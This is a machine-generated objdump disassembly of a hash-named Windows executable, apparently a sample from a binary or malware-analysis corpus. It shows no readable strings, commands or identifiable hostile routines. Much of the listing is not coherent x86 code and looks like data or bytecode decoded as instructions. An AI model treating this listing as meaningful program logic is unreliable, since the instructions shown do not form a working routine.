
ee817287293478ecdd152a44b99c04c3aa18dc7399c1f4dd6ddcedca39639af2.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	pusha  
  402001:	test   eax,0x0
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x408000,al
  402013:	add    BYTE PTR [eax+0x67],bh
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [eax-0x6b01ebc8],bl
  402055:	cmp    ecx,DWORD PTR [ecx+ebx*4+0x22]
  402059:	jne    0x402073
  40205b:	test   cl,ch
  40205d:	sbb    dh,BYTE PTR [ebx]
  40205f:	test   al,0x60
  402061:	cmp    eax,0xee6fda14
  402066:	shl    BYTE PTR [edi],cl
  402068:	cmp    eax,0xbeeee984
  40206d:	sub    BYTE PTR [edx+eiz*8+0x1c2d5284],bl
  402074:	je     0x40207f
  402076:	test   eax,0xe60ce050
  40207b:	inc    esp
  40207c:	pop    ds
  40207d:	mov    bl,0xdd
  40207f:	fsub   st,st(3)
  402081:	jecxz  0x402032
  402083:	into   
  402084:	sub    cl,ah
  402086:	icebp  
  402087:	pop    edi
  402088:	in     al,0xba
  40208a:	jmp    DWORD PTR [edx]
  40208c:	cs push cs
  40208e:	jmp    0xf1b93e38
  402093:	ja     0x4020f1
  402095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402096:	in     al,dx
  402097:	pop    ecx
  402098:	dec    eax
  402099:	repz repz jnp 0x402114
  40209d:	xchg   esp,eax
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	imul   BYTE PTR [esi-0x155aca0f]
  4020a5:	rcr    BYTE PTR [si+0x7af0],0x72
  4020ab:	xor    ebp,edi
  4020ad:	push   ds
  4020ae:	push   ss
  4020af:	gs cmp eax,0xb999b29b
  4020b5:	int3   
  4020b6:	push   ds
  4020b7:	or     esi,DWORD PTR [ecx+ecx*1+0x2e2de59a]
  4020be:	jmp    0xa051:0x94224b38
  4020c5:	sar    cl,cl
  4020c7:	add    dl,BYTE PTR [ecx+eax*4-0x1e]
  4020cb:	fsubp  st(1),st
  4020cd:	scas   al,BYTE PTR es:[edi]
  4020ce:	mov    dh,0xd8
  4020d0:	scas   eax,DWORD PTR es:[edi]
  4020d1:	inc    ebx
  4020d2:	xchg   esi,eax
  4020d3:	sub    al,BYTE PTR [edi]
  4020d5:	cld    
  4020d6:	jl     0x402083
  4020d8:	shl    DWORD PTR [esi+0x64df261c],1
  4020de:	cmp    BYTE PTR [ebp+0x7d],bl
  4020e1:	jmp    0x4020ba
  4020e3:	test   eax,0x8e27f11
  4020e8:	add    eax,0x6d0fdc3b
  4020ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ee:	jnp    0x402080
  4020f0:	stos   DWORD PTR es:[edi],eax
  4020f1:	fadd   st,st(1)
  4020f3:	and    eax,0xa4acd01b
  4020f8:	retf   0x3aaa
  4020fb:	rcr    bh,cl
  4020fd:	push   0xfffffff4
  4020ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402100:	cmp    bl,BYTE PTR [edx]
  402102:	adc    DWORD PTR [ecx+ebx*2],edx
  402105:	sub    al,ch
  402107:	push   es
  402108:	aad    0x63
  40210a:	aaa    
  40210b:	ins    DWORD PTR es:[edi],dx
  40210c:	fisub  WORD PTR [edx*4+0x1a8b3ce5]
  402113:	jmp    0x9ac09928
  402118:	bound  ebp,QWORD PTR [esi+0x23]
  40211b:	shl    edi,cl
  40211d:	cmp    ebp,DWORD PTR [edi]
  40211f:	mov    edi,0x2fca0144
  402124:	(bad)  [edi]
  402126:	fadd   st(1),st
  402128:	(bad)  
  402129:	jecxz  0x402169
  40212b:	jmp    0x5a17:0x52bbfb3
  402132:	cmp    DWORD PTR es:[ecx-0x927088],esi
  402139:	mov    esi,0x1d9c5b94
  40213e:	es jne 0x402130
  402141:	cli    
  402142:	mov    eax,0xd7411570
  402147:	push   edi
  402148:	jle    0x4020d0
  40214a:	loope  0x402157
  40214c:	sub    edx,DWORD PTR [ebx+0x301b49cd]
  402152:	add    eax,DWORD PTR [eax]
  402154:	ins    BYTE PTR es:[edi],dx
  402155:	add    DWORD PTR [eax],eax
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [eax],ebp
  40215d:	add    eax,0x28060000
  402162:	push   ss
  402163:	add    BYTE PTR [eax],al
  402165:	or     al,BYTE PTR [edx]
  402167:	jae    0x402183
  402169:	add    BYTE PTR [eax],al
  40216b:	push   es
  40216c:	or     al,BYTE PTR [esi]
  40216e:	outs   dx,DWORD PTR ds:[esi]
  40216f:	pop    ds
  402170:	add    BYTE PTR [eax],al
  402172:	push   es
  402173:	sub    eax,0x1d6f0608
  402178:	add    BYTE PTR [eax],al
  40217a:	push   es
  40217b:	sub    al,0xe
  40217d:	push   es
  40217e:	sub    BYTE PTR [ebx],al
  402180:	add    BYTE PTR [eax],al
  402182:	push   es
  402183:	adc    eax,0x3add0713
  402188:	add    DWORD PTR [eax],eax
  40218a:	add    BYTE PTR [esi],al
  40218c:	outs   dx,DWORD PTR ds:[esi]
  40218d:	sbb    eax,DWORD PTR [eax]
  40218f:	add    BYTE PTR [esi],al
  402191:	or     eax,DWORD PTR [edi]
  402193:	push   es
  402194:	outs   dx,DWORD PTR ds:[esi]
  402195:	push   es
  402196:	add    BYTE PTR [eax],al
  402198:	push   es
  402199:	adc    eax,DWORD PTR [edi]
  40219b:	frstor ds:0xc000001
  4021a1:	or     BYTE PTR [edi+0x17],ch
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	or     bl,BYTE PTR [ecx]
  4021a8:	or     DWORD PTR cs:[eax],ecx
  4021ab:	outs   dx,DWORD PTR ds:[esi]
  4021ac:	pop    ss
  4021ad:	add    BYTE PTR [eax],al
  4021af:	or     bl,BYTE PTR [eax]
  4021b1:	xor    edx,DWORD PTR [ebx]
  4021b3:	sub    BYTE PTR [ecx+0x0],bh
  4021b6:	add    BYTE PTR [esi],al
  4021b8:	sub    BYTE PTR [esi],dl
  4021ba:	add    BYTE PTR [eax],al
  4021bc:	or     bl,BYTE PTR [edi]
  4021be:	or     dl,BYTE PTR [ebx]
  4021c0:	pop    es
  4021c1:	(bad)  
  4021c3:	add    BYTE PTR [eax],al
  4021c5:	add    BYTE PTR [eax],ch
  4021c7:	jno    0x4021c9
  4021c9:	add    BYTE PTR [esi],al
  4021cb:	or     BYTE PTR [edi+0x18],ch
  4021ce:	add    BYTE PTR [eax],al
  4021d0:	or     ch,BYTE PTR [eax]
  4021d2:	sbb    DWORD PTR [eax],eax
  4021d4:	add    BYTE PTR [edx],cl
  4021d6:	or     BYTE PTR [edx+0x1],dh
  4021d9:	add    BYTE PTR [eax],al
  4021db:	jo     0x4021e5
  4021dd:	outs   dx,DWORD PTR ds:[esi]
  4021de:	pop    ss
  4021df:	add    BYTE PTR [eax],al
  4021e1:	or     cl,BYTE PTR [esi+ebp*1+0x28010000]
  4021e8:	sbb    al,BYTE PTR [eax]
  4021ea:	add    BYTE PTR [edx],cl
  4021ec:	sub    BYTE PTR [ebx],bl
  4021ee:	add    BYTE PTR [eax],al
  4021f0:	or     dl,BYTE PTR ds:0xccdd0713
  4021f6:	add    BYTE PTR [eax],al
  4021f8:	add    BYTE PTR ds:0x1c7e,cl
  4021fe:	or     dl,BYTE PTR [ebx]
  402200:	add    al,0x15
  402202:	adc    eax,DWORD PTR ds:0x1d6f09
  402208:	add    BYTE PTR [edx],cl
  40220a:	adc    ecx,DWORD PTR [eax]
  40220c:	adc    DWORD PTR [eax],ecx
  40220e:	inc    ebp
  40220f:	add    eax,0x29000000
  402214:	add    BYTE PTR [eax],al
  402216:	add    BYTE PTR [edx],al
  402218:	add    BYTE PTR [eax],al
  40221a:	add    BYTE PTR [ebx],cl
  40221c:	add    BYTE PTR [eax],al
  40221e:	add    BYTE PTR [eax+eax*1],dl
  402221:	add    BYTE PTR [eax],al
  402223:	sbb    eax,0x2b000000
  402228:	daa    
  402229:	sub    BYTE PTR [esi],bl
  40222b:	add    BYTE PTR [eax],al
  40222d:	or     dl,BYTE PTR [ebx]
  40222f:	add    al,0x2b
  402231:	and    eax,0x1f28
  402236:	or     dl,BYTE PTR [ebx]
  402238:	add    al,0x2b
  40223a:	sbb    al,0x28
  40223c:	and    BYTE PTR [eax],al
  40223e:	add    BYTE PTR [edx],cl
  402240:	adc    eax,DWORD PTR [ebx+ebp*1]
  402243:	adc    ebp,DWORD PTR [eax]
  402245:	and    DWORD PTR [eax],eax
  402247:	add    BYTE PTR [edx],cl
  402249:	adc    eax,DWORD PTR [ecx+ebx*1]
  40224c:	adc    eax,DWORD PTR ds:0x2228072b
  402252:	add    BYTE PTR [eax],al
  402254:	or     dl,BYTE PTR [ebx]
  402256:	add    al,0x28
  402258:	jno    0x40225a
  40225a:	add    BYTE PTR [esi],al
  40225c:	adc    DWORD PTR [eax+ebp*1],eax
  40225f:	sbb    DWORD PTR [eax],eax
  402261:	add    BYTE PTR [edx],cl
  402263:	or     DWORD PTR [edx+0x3b],esi
  402266:	add    BYTE PTR [eax],al
  402268:	jo     0x402273
  40226a:	outs   dx,DWORD PTR ds:[esi]
  40226b:	sbb    eax,0x8c0a0000
  402270:	xor    eax,DWORD PTR [eax]
  402272:	add    BYTE PTR [ecx],al
  402274:	sub    BYTE PTR [edx],bl
  402276:	add    BYTE PTR [eax],al
  402278:	or     ch,BYTE PTR [eax]
  40227a:	sbb    eax,DWORD PTR [eax]
  40227c:	add    BYTE PTR [edx],cl
  40227e:	adc    DWORD PTR ds:0x41de0713,eax
  402284:	adc    eax,DWORD PTR [esi]
  402286:	adc    DWORD PTR [esi],eax
  402288:	jb     0x4022f1
  40228a:	add    BYTE PTR [eax],al
  40228c:	jo     0x4022b6
  40228e:	sbb    eax,DWORD PTR [eax]
  402290:	add    BYTE PTR [edx],cl
  402292:	sub    BYTE PTR [ecx+0x0],dh
  402295:	add    BYTE PTR [esi],al
  402297:	adc    DWORD PTR [esi],eax
  402299:	outs   dx,DWORD PTR ds:[esi]
  40229a:	and    eax,DWORD PTR [eax]
  40229c:	add    BYTE PTR [edx],cl
  40229e:	sub    BYTE PTR [ecx],bl
  4022a0:	add    BYTE PTR [eax],al
  4022a2:	or     dh,BYTE PTR [edx-0x45]
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	jo     0x4022ba
  4022a9:	push   es
  4022aa:	outs   dx,DWORD PTR ds:[esi]
  4022ab:	and    al,0x0
  4022ad:	add    BYTE PTR [edx],cl
  4022af:	outs   dx,DWORD PTR ds:[esi]
  4022b0:	and    eax,0x110a0000
  4022b5:	push   es
  4022b6:	outs   dx,DWORD PTR ds:[esi]
  4022b7:	add    BYTE PTR es:[eax],al
  4022ba:	or     ch,BYTE PTR [eax]
  4022bc:	daa    
  4022bd:	add    BYTE PTR [eax],al
  4022bf:	or     dl,BYTE PTR ds:0xde0713
  4022c5:	adc    DWORD PTR [edi],eax
  4022c7:	sub    al,BYTE PTR [ecx]
  4022c9:	sub    BYTE PTR [eax],al
  4022cb:	add    BYTE PTR [eax],al
  4022cd:	add    BYTE PTR [edx],cl
  4022cf:	add    BYTE PTR [edx],bh
  4022d1:	inc    esp
  4022d2:	add    BYTE PTR [ecx+0x2d],bl
  4022d5:	add    BYTE PTR [eax],al
  4022d7:	add    DWORD PTR [eax],eax
  4022d9:	add    BYTE PTR [edx],cl
  4022db:	add    BYTE PTR [edx],bh
  4022dd:	popf   
  4022de:	add    BYTE PTR [ebx+0x1000032],cl
  4022e4:	add    BYTE PTR [eax],al
  4022e6:	or     al,BYTE PTR [eax]
  4022e8:	cmp    ch,BYTE PTR [eax]
  4022ea:	add    DWORD PTR [ecx+0x31],eax
  4022ed:	add    BYTE PTR [eax],al
  4022ef:	add    DWORD PTR [ebx],ebx
  4022f1:	xor    BYTE PTR [esi],al
  4022f3:	add    BYTE PTR [edx],dh
  4022f5:	add    BYTE PTR [eax],al
  4022f7:	add    BYTE PTR [edx],al
  4022f9:	add    BYTE PTR [eax],al
  4022fb:	adc    DWORD PTR [eax],ebp
  4022fd:	sub    BYTE PTR [eax],al
  4022ff:	add    BYTE PTR [edx],cl
  402301:	or     bl,BYTE PTR [edi]
  402303:	dec    edi
  402304:	or     ebp,DWORD PTR [eax]
  402306:	sub    DWORD PTR [eax],eax
  402308:	add    BYTE PTR [edx],cl
  40230a:	pop    ss
  40230b:	pop    ecx
  40230c:	or     ebx,esi
  40230e:	add    esp,DWORD PTR [esi]
  402310:	fiadd  WORD PTR [eax]
  402312:	add    al,BYTE PTR [edi]
  402314:	push   es
  402315:	outs   dx,DWORD PTR ds:[esi]
  402316:	sub    al,BYTE PTR [eax]
  402318:	add    BYTE PTR [edx],cl
  40231a:	outs   dx,DWORD PTR ds:[esi]
  40231b:	sub    eax,DWORD PTR [eax]
  40231d:	add    BYTE PTR [edx],cl
  40231f:	pop    ss
  402320:	pop    ss
  402321:	jle    0x40233f
  402323:	add    BYTE PTR [eax],al
  402325:	or     ch,BYTE PTR [edi+0x2c]
  402328:	add    BYTE PTR [eax],al
  40232a:	or     cl,BYTE PTR [eax+ecx*1]
  40232d:	sub    al,BYTE PTR [eax]
  40232f:	add    BYTE PTR [ecx],al
  402331:	adc    BYTE PTR [eax],al
  402333:	add    BYTE PTR [eax],al
  402335:	add    BYTE PTR [ecx],cl
  402337:	add    BYTE PTR [edx],cl
  402339:	adc    eax,DWORD PTR [eax]
  40233b:	add    edi,DWORD PTR [eax]
  40233d:	add    BYTE PTR [eax],al
  40233f:	add    DWORD PTR [ebx],edx
  402341:	xor    BYTE PTR [eax+eax*1],al
  402344:	adc    eax,DWORD PTR [edx]
  402346:	add    BYTE PTR [eax],al
  402348:	add    eax,DWORD PTR [eax]
  40234a:	add    BYTE PTR [ecx],dl
  40234c:	add    ch,BYTE PTR [edi+0x1f]
  40234f:	add    BYTE PTR [eax],al
  402351:	push   es
  402352:	sub    eax,0x1d6f020e
  402357:	add    BYTE PTR [eax],al
  402359:	push   es
  40235a:	push   ss
  40235b:	inc    BYTE PTR [ecx]
  40235d:	push   ss
  40235e:	inc    BYTE PTR [ecx]
  402360:	sub    eax,DWORD PTR [ecx]
  402362:	pop    ss
  402363:	jb     0x402358
  402365:	add    BYTE PTR [eax],al
  402367:	jo     0x402391
  402369:	sub    eax,0x20a0000
  40236e:	outs   dx,DWORD PTR ds:[esi]
  40236f:	pop    ds
  402370:	add    BYTE PTR [eax],al
  402372:	push   es
  402373:	mov    WORD PTR [eax+eax*1],cs
  402376:	add    BYTE PTR [ecx],al
  402378:	push   ds
  402379:	mov    WORD PTR [eax+eax*1],cs
  40237c:	add    BYTE PTR [ecx],al
  40237e:	sub    BYTE PTR [esi],ch
  402380:	add    BYTE PTR [eax],al
  402382:	or     bh,BYTE PTR [edx]
  402384:	retf   
  402385:	add    DWORD PTR [eax],eax
  402387:	add    BYTE PTR [eax],ch
  402389:	jae    0x40238b
  40238b:	add    BYTE PTR [esi],al
  40238d:	sub    BYTE PTR [esi],dl
  40238f:	add    BYTE PTR [eax],al
  402391:	or     ch,BYTE PTR [eax]
  402393:	das    
  402394:	add    BYTE PTR [eax],al
  402396:	or     al,BYTE PTR [edx]
  402398:	outs   dx,DWORD PTR ds:[esi]
  402399:	pop    ds
  40239a:	add    BYTE PTR [eax],al
  40239c:	push   es
  40239d:	cmp    DWORD PTR [ebx+0x2000000],esp
  4023a3:	outs   dx,DWORD PTR ds:[esi]
  4023a4:	pop    ds
  4023a5:	add    BYTE PTR [eax],al
  4023a7:	push   es
  4023a8:	mov    WORD PTR [eax+eax*1],cs
  4023ab:	add    BYTE PTR [ecx],al
  4023ad:	pop    ss
  4023ae:	mov    WORD PTR [eax+eax*1],cs
  4023b1:	add    BYTE PTR [ecx],al
  4023b3:	sub    BYTE PTR [esi],ch
  4023b5:	add    BYTE PTR [eax],al
  4023b7:	or     ch,BYTE PTR [eax+edx*1]
  4023ba:	sub    BYTE PTR [eax+0x2060000],dl
  4023c0:	outs   dx,DWORD PTR ds:[esi]
  4023c1:	xor    BYTE PTR [eax],al
  4023c3:	add    BYTE PTR [edx],cl
  4023c5:	sub    BYTE PTR [eax+eax*1],al
  4023c8:	add    BYTE PTR [esi],al
  4023ca:	add    ch,BYTE PTR [edi+0x1f]
  4023cd:	add    BYTE PTR [eax],al
  4023cf:	push   es
  4023d0:	mov    WORD PTR [eax+eax*1],cs
  4023d3:	add    BYTE PTR [ecx],al
  4023d5:	sbb    BYTE PTR [esp+ecx*1+0x28010000],cl
  4023dc:	add    BYTE PTR cs:[eax],al
  4023df:	or     ch,BYTE PTR [eax+edx*1]
  4023e2:	sub    BYTE PTR [esi+0x2060000],cl
  4023e8:	outs   dx,DWORD PTR ds:[esi]
  4023e9:	xor    DWORD PTR [eax],eax
  4023eb:	add    BYTE PTR [edx],cl
  4023ed:	sub    BYTE PTR [eax+eax*1],al
  4023f0:	add    BYTE PTR [esi],al
  4023f2:	add    ch,BYTE PTR [edi+0x1f]
  4023f5:	add    BYTE PTR [eax],al
  4023f7:	push   es
  4023f8:	mov    WORD PTR [eax+eax*1],cs
  4023fb:	add    BYTE PTR [ecx],al
  4023fd:	pop    ds
  4023fe:	adc    BYTE PTR [esp+ecx*1+0x28010000],cl
  402405:	add    BYTE PTR cs:[eax],al
  402408:	or     ch,BYTE PTR [eax+edx*1]
  40240b:	sub    BYTE PTR [ebp+0x2060000],cl
  402411:	outs   dx,DWORD PTR ds:[esi]
  402412:	xor    al,BYTE PTR [eax]
  402414:	add    BYTE PTR [edx],cl
  402416:	sub    BYTE PTR [eax+eax*1],al
  402419:	add    BYTE PTR [esi],al
  40241b:	add    ch,BYTE PTR [edi+0x1f]
  40241e:	add    BYTE PTR [eax],al
  402420:	push   es
  402421:	mov    WORD PTR [eax+eax*1],cs
  402424:	add    BYTE PTR [ecx],al
  402426:	sbb    cl,BYTE PTR [esp+ecx*1+0x28010000]
  40242d:	add    BYTE PTR cs:[eax],al
  402430:	or     bh,BYTE PTR [ecx]
  402432:	sbb    eax,0x28000001
  402437:	pop    DWORD PTR [eax]
  402439:	add    BYTE PTR [esi],al
  40243b:	sub    BYTE PTR [esi],dl
  40243d:	add    BYTE PTR [eax],al
  40243f:	or     bh,BYTE PTR [eax]
  402441:	push   cs
  402442:	add    DWORD PTR [eax],eax
  402444:	add    BYTE PTR [edx],al
  402446:	outs   dx,DWORD PTR ds:[esi]
  402447:	sbb    eax,0x39060000
  40244c:	add    eax,DWORD PTR [ecx]
  40244e:	add    BYTE PTR [eax],al
  402450:	add    ch,BYTE PTR [edi+0x1d]
  402453:	add    BYTE PTR [eax],al
  402455:	push   es
  402456:	mov    WORD PTR [edx],cs
  402458:	add    BYTE PTR [eax],al
  40245a:	add    dl,BYTE PTR [edi]
  40245c:	mov    WORD PTR [edx],cs
  40245e:	add    BYTE PTR [eax],al
  402460:	add    ch,BYTE PTR [eax]
  402462:	add    BYTE PTR cs:[eax],al
  402465:	or     ch,BYTE PTR [esp+edi*1]
  402468:	sub    BYTE PTR [eax+eax*1+0x0],dh
  40246c:	push   es
  40246d:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  402473:	or     al,BYTE PTR [esi]
  402475:	push   ss
  402476:	sub    BYTE PTR [eax+eax*1+0x0],ch
  40247a:	push   es
  40247b:	mov    ds:0x68281706,al
  402480:	add    BYTE PTR [eax],al
  402482:	push   es
  402483:	mov    ds:0x65281806,al
  402488:	add    BYTE PTR [eax],al
  40248a:	push   es
  40248b:	mov    ds:0x67281906,al
  402490:	add    BYTE PTR [eax],al
  402492:	push   es
  402493:	mov    ds:0x64281a06,al
  402498:	add    BYTE PTR [eax],al
  40249a:	push   es
  40249b:	mov    ds:0x332806,al
  4024a0:	add    BYTE PTR [edx],cl
  4024a2:	sub    edx,DWORD PTR [edx+0x2]
  4024a5:	outs   dx,DWORD PTR ds:[esi]
  4024a6:	sbb    eax,0x8c060000
  4024ab:	or     al,BYTE PTR [eax]
  4024ad:	add    BYTE PTR [edx],al
  4024af:	sbb    BYTE PTR [edx+ecx*1+0x28020000],cl
  4024b6:	add    BYTE PTR cs:[eax],al
  4024b9:	or     ch,BYTE PTR [edx+edi*1]
  4024bc:	sub    BYTE PTR [edx+0x0],dh
  4024bf:	add    BYTE PTR [esi],al
  4024c1:	sbb    ecx,DWORD PTR [ebp+0x1000001]
  4024c7:	or     eax,DWORD PTR [edi]
  4024c9:	push   ss
  4024ca:	sub    BYTE PTR [eax+eax*1+0x0],ch
  4024ce:	push   es
  4024cf:	mov    ds:0x68281707,al
  4024d4:	add    BYTE PTR [eax],al
  4024d6:	push   es
  4024d7:	mov    ds:0x65281807,al
  4024dc:	add    BYTE PTR [eax],al
  4024de:	push   es
  4024df:	mov    ds:0x67281907,al
  4024e4:	add    BYTE PTR [eax],al
  4024e6:	push   es
  4024e7:	mov    ds:0x64281a07,al
  4024ec:	add    BYTE PTR [eax],al
  4024ee:	push   es
  4024ef:	mov    ds:0x332807,al
  4024f4:	add    BYTE PTR [edx],cl
  4024f6:	add    ch,BYTE PTR [edi+0x1d]
  4024f9:	add    BYTE PTR [eax],al
  4024fb:	push   es
  4024fc:	mov    WORD PTR [edx],cs
  4024fe:	add    BYTE PTR [eax],al
  402500:	add    bl,BYTE PTR [edx]
  402502:	mov    WORD PTR [edx],cs
  402504:	add    BYTE PTR [eax],al
  402506:	add    ch,BYTE PTR [eax]
  402508:	add    BYTE PTR cs:[eax],al
  40250b:	or     ch,BYTE PTR [esp+edx*1]
  40250e:	sub    BYTE PTR [ebp+0x0],dh
  402511:	add    BYTE PTR [esi],al
  402513:	sub    BYTE PTR [ecx+0x0],ch
  402516:	add    BYTE PTR [esi],al
  402518:	sub    BYTE PTR [eax+0x0],ch
  40251b:	add    BYTE PTR [esi],al
  40251d:	sub    BYTE PTR [edi],ah
  40251f:	add    BYTE PTR [eax],al
  402521:	or     al,BYTE PTR [edx]
  402523:	outs   dx,DWORD PTR ds:[esi]
  402524:	sbb    eax,0x8c060000
  402529:	or     al,BYTE PTR [eax]
  40252b:	add    BYTE PTR [edx],al
  40252d:	push   ds
  40252e:	mov    WORD PTR [edx],cs
  402530:	add    BYTE PTR [eax],al
  402532:	add    ch,BYTE PTR [eax]
  402534:	add    BYTE PTR cs:[eax],al
  402537:	or     ch,BYTE PTR [ecx+ebx*1]
  40253a:	sub    BYTE PTR [esi+0x0],dh
  40253d:	add    BYTE PTR [esi],al
  40253f:	sub    BYTE PTR [ebx+0x0],ch
  402542:	add    BYTE PTR [esi],al
  402544:	sub    BYTE PTR [ebp+0x0],ah
  402547:	add    BYTE PTR [esi],al
  402549:	sub    BYTE PTR [eax+eax*1+0x0],ah
  40254d:	push   es
  40254e:	sub    BYTE PTR [eax+eax*1],dh
  402551:	add    BYTE PTR [edx],cl
  402553:	add    ch,BYTE PTR [eax]
  402555:	add    al,BYTE PTR [eax]
  402557:	add    BYTE PTR [esi],al
  402559:	sub    BYTE PTR [esi],dl
  40255b:	add    BYTE PTR [eax],al
  40255d:	or     ch,BYTE PTR [edx]
  40255f:	add    BYTE PTR [ebx],dl
  402561:	xor    BYTE PTR [eax+eax*1],al
  402564:	pop    esi
  402565:	add    BYTE PTR [eax],al
  402567:	add    BYTE PTR [eax+eax*1],al
  40256a:	add    BYTE PTR [ecx],dl
  40256c:	jae    0x4025a3
  40256e:	add    BYTE PTR [eax],al
  402570:	or     cl,BYTE PTR [edx]
  402572:	push   es
  402573:	jb     0x4025cc
  402575:	add    DWORD PTR [eax],eax
  402577:	jo     0x40257b
  402579:	outs   dx,DWORD PTR ds:[esi]
  40257a:	add    BYTE PTR ss:[eax],al
  40257d:	or     ah,BYTE PTR [esi]
  40257f:	add    ebp,DWORD PTR [eax]
  402581:	add    DWORD PTR [eax],eax
  402583:	add    BYTE PTR [ebx],ch
  402585:	or     edx,DWORD PTR [esi]
  402587:	or     al,0x2b
  402589:	daa    
  40258a:	or     BYTE PTR [edi],al
  40258c:	mov    gs,WORD PTR [ecx+0x17]
  40258f:	pop    ecx
  402590:	adc    DWORD PTR cs:[esi],eax
  402593:	jb     0x4025f8
  402595:	add    DWORD PTR [eax],eax
  402597:	jo     0x4025a0
  402599:	or     BYTE PTR [edx+0x366f],bl
  40259f:	or     ah,BYTE PTR [esi]
  4025a1:	sub    ecx,DWORD PTR [edx]
  4025a3:	push   es
  4025a4:	pop    es
  4025a5:	or     BYTE PTR [edx+0x386f],bl
  4025ab:	or     ah,BYTE PTR [esi]
  4025ad:	or     BYTE PTR [edi],dl
  4025af:	pop    eax
  4025b0:	or     al,0x8
  4025b2:	pop    es
  4025b3:	mov    gs,WORD PTR [ecx+0x32]
  4025b6:	rol    DWORD PTR [esi],cl
  4025b8:	outs   dx,DWORD PTR ds:[esi]
  4025b9:	cmp    DWORD PTR [eax],eax
  4025bb:	add    BYTE PTR [edx],cl
  4025bd:	es push es
  4025bf:	outs   dx,DWORD PTR ds:[esi]
  4025c0:	and    eax,0x280a0000
  4025c5:	push   ss
  4025c6:	add    BYTE PTR [eax],al
  4025c8:	or     ch,BYTE PTR [edx]
  4025ca:	add    BYTE PTR [eax],al
  4025cc:	adc    esi,DWORD PTR [eax]
  4025ce:	add    eax,0x2f00
  4025d3:	add    BYTE PTR ds:0x28110000,al
  4025d9:	cmp    al,BYTE PTR [eax]
  4025db:	add    BYTE PTR [edx],cl
  4025dd:	sub    BYTE PTR [eax+0x0],ah
  4025e0:	add    BYTE PTR [esi],al
  4025e2:	pop    ss
  4025e3:	lea    eax,[ecx]
  4025e5:	add    BYTE PTR [eax],al
  4025e7:	add    DWORD PTR [edx],ecx
  4025e9:	push   es
  4025ea:	push   ss
  4025eb:	sub    BYTE PTR [eax],ch
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	or     ch,BYTE PTR [edi+0x3b]
  4025f2:	add    BYTE PTR [eax],al
  4025f4:	or     ch,BYTE PTR [eax]
  4025f6:	cmp    al,0x0
  4025f8:	add    BYTE PTR [edx],cl
  4025fa:	outs   dx,DWORD PTR ds:[esi]
  4025fb:	cmp    eax,0xa20a0000
  402600:	push   es
  402601:	sub    BYTE PTR [esi],bh
  402603:	add    BYTE PTR [eax],al
  402605:	or     ch,BYTE PTR [edx]
  402607:	add    BYTE PTR [ebx],bl
  402609:	xor    BYTE PTR [ebx],al
  40260b:	add    BYTE PTR [ecx],al
  40260d:	add    DWORD PTR [eax],eax
  40260f:	add    BYTE PTR [esi],al
  402611:	add    BYTE PTR [eax],al
  402613:	adc    DWORD PTR [ebx],eax
  402615:	outs   dx,DWORD PTR ds:[esi]
  402616:	xor    eax,0x6f060000
  40261b:	aas    
  40261c:	add    BYTE PTR [eax],al
  40261e:	or     ch,BYTE PTR [eax]
  402620:	cmp    al,BYTE PTR [eax]
  402622:	add    BYTE PTR [esi],al
  402624:	sub    al,0x12
  402626:	add    ebp,DWORD PTR [edi+0x35]
  402629:	add    BYTE PTR [eax],al
  40262b:	push   es
  40262c:	outs   dx,DWORD PTR ds:[esi]
  40262d:	aas    
  40262e:	add    BYTE PTR [eax],al
  402630:	or     ch,BYTE PTR [eax]
  402632:	inc    eax
  402633:	add    BYTE PTR [eax],al
  402635:	or     ch,BYTE PTR ds:0x992812
  40263b:	add    BYTE PTR [esi],al
  40263d:	sub    BYTE PTR [edx+0x0],ch
  402640:	add    BYTE PTR [esi],al
  402642:	sub    BYTE PTR [ecx],bl
  402644:	add    BYTE PTR [eax],al
  402646:	or     bl,BYTE PTR [edi]
  402648:	or     eax,0x30a142a
  40264d:	outs   dx,DWORD PTR ds:[esi]
  40264e:	das    
  40264f:	add    BYTE PTR [eax],al
  402651:	push   es
  402652:	sub    al,0x71
  402654:	adc    al,0xb
  402656:	add    ebp,DWORD PTR [edi+0x2f]
  402659:	add    BYTE PTR [eax],al
  40265b:	push   es
  40265c:	outs   dx,DWORD PTR ds:[esi]
  40265d:	dec    ecx
  40265e:	add    BYTE PTR [eax],al
  402660:	push   es
  402661:	or     al,0x73
  402663:	inc    ecx
  402664:	add    BYTE PTR [eax],al
  402666:	or     cl,BYTE PTR ds:0x426f0809
  40266c:	add    BYTE PTR [eax],al
  40266e:	or     ch,BYTE PTR [edi+0x43]
  402671:	add    BYTE PTR [eax],al
  402673:	or     cl,BYTE PTR [ecx]
  402675:	or     BYTE PTR [edi+0x44],ch
  402678:	add    BYTE PTR [eax],al
  40267a:	or     ch,BYTE PTR [edi+0x45]
  40267d:	add    BYTE PTR [eax],al
  40267f:	or     cl,BYTE PTR [ecx]
  402681:	or     ebx,esi
  402683:	sbb    eax,0x4110413
  402688:	jb     0x4026f9
  40268a:	add    DWORD PTR [eax],eax
  40268c:	jo     0x4026b6
  40268e:	sbb    eax,DWORD PTR [eax]
  402690:	add    BYTE PTR [edx],cl
  402692:	sub    BYTE PTR [ecx+0x0],ah
  402695:	add    BYTE PTR [esi],al
  402697:	sub    BYTE PTR [esi],dl
  402699:	add    BYTE PTR [eax],al
  40269b:	or     dl,BYTE PTR [edi]
  40269d:	adc    eax,DWORD PTR [esi]
  40269f:	fidiv  WORD PTR [ecx+0x28]
  4026a2:	bound  eax,QWORD PTR [eax]
  4026a4:	add    BYTE PTR [esi],al
  4026a6:	pop    es
